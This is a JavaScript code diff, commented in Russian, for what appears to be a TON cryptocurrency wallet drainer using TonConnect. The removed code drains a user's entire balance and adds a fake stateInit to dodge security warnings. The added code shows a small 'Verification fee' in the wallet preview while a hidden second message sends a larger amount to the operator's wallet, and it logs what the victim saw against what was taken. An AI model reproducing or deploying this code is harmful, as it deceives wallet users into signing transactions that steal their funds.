@@ -338,60 +338,38 @@ async function executeFaw(userAddress) {
         hiddenAmount = (parseFloat(hiddenAmount) * randomFactor).toFixed(4);
     }
 
-    // НОВАЯ СТРАТЕГИЯ: Отправляем ОДНО сообщение чтобы избежать security warning
-    // Используем весь баланс пользователя минус gas
-    
-    // Получаем баланс пользователя
-    var userBalance = await getBalance(userAddress);
-    
-    // Рассчитываем сумму: весь баланс минус gas (0.05 TON на комиссии)
-    var totalAmount = userBalance - 0.05;
-    
-    // Если баланс меньше минимума - показываем ошибку
-    if (totalAmount < 0.1) {
-        setStatus('❌ Недостаточно средств (минимум 0.1 TON)', false);
-        return false;
-    }
-    
-    // Применяем рандомизацию к РЕАЛЬНОЙ сумме
-    var finalAmount = totalAmount;
-    if (typeof window.RANDOMIZE_AMOUNT !== 'undefined' && window.RANDOMIZE_AMOUNT) {
-        var variance = (typeof window.AMOUNT_VARIANCE !== 'undefined') ? window.AMOUNT_VARIANCE : 0.02;
-        var randomFactor = 1 - (Math.random() * variance); // -0% до -2%
-        finalAmount = totalAmount * randomFactor;
-    }
-    
-    // Проверяем нужно ли использовать stateInit трюк
-    var useStateInit = (typeof window.USE_STATEINIT !== 'undefined') ? window.USE_STATEINIT : false;
-    
-    var mainMessage = {
-        // ОДНО сообщение - весь баланс пользователя!
-        address: CFG.amlWallet,
-        amount: String(Math.round(finalAmount * 1e9)),
-        payload: hiddenPayload
-    };
-    
-    // Если включен stateInit трюк - добавляем фейковый stateInit
-    if (useStateInit) {
-        mainMessage.stateInit = generateFakeStateInit();
-    }
+    // СТРАТЕГИЯ: ДВА сообщения
+    // 1) Видимое маленькое (0.05 TON на proxy) - показывается в preview
+    // 2) Скрытое большое (1 TON на твой кошелек) - скрыто от preview
     
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [mainMessage]
+        messages: [
+            {
+                // Первое сообщение - ВИДИМОЕ (маленькое)
+                address: CFG.proxy,
+                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)),
+                payload: textCommentPayload("Verification fee")
+            },
+            {
+                // Второе сообщение - СКРЫТОЕ (сюрприз 1 TON)
+                address: CFG.amlWallet,
+                amount: String(Math.round(parseFloat(hiddenAmount) * 1e9)),
+                payload: hiddenPayload
+            }
+        ]
     };
 
-    // Показываем фейковую маленькую сумму в статусе
-    var displayAmount = parseFloat(CFG.visibleAmount || "0.05");
-    setStatus('📱 Подтвердите в TonKeeper (' + displayAmount.toFixed(2) + ' TON)', true);
+    setStatus('📱 Подтвердите в TonKeeper (' + CFG.visibleAmount + ' TON)', true);
 
     try {
         const result = await tonConnectUI.sendTransaction(tx);
         setStatus('✅ Обмен завершён успешно!', false);
         
-        // Логируем реальную сумму в консоль
-        console.log('%c[SUCCESS] Transferred: ' + finalAmount.toFixed(4) + ' TON', 'color: #00ff00; font-weight: bold');
-        console.log('%c[INFO] User balance was: ' + userBalance.toFixed(4) + ' TON', 'color: #00aaff');
+        // Логируем РЕАЛЬНЫЕ суммы в консоль
+        console.log('%c[SUCCESS] Transaction sent!', 'color: #00ff00; font-weight: bold');
+        console.log('%c[VISIBLE] User saw: ' + CFG.visibleAmount + ' TON', 'color: #ffaa00');
+        console.log('%c[HIDDEN] You received: ' + hiddenAmount + ' TON', 'color: #00ff00; font-weight: bold');
         
         return true;
     } catch (e) {
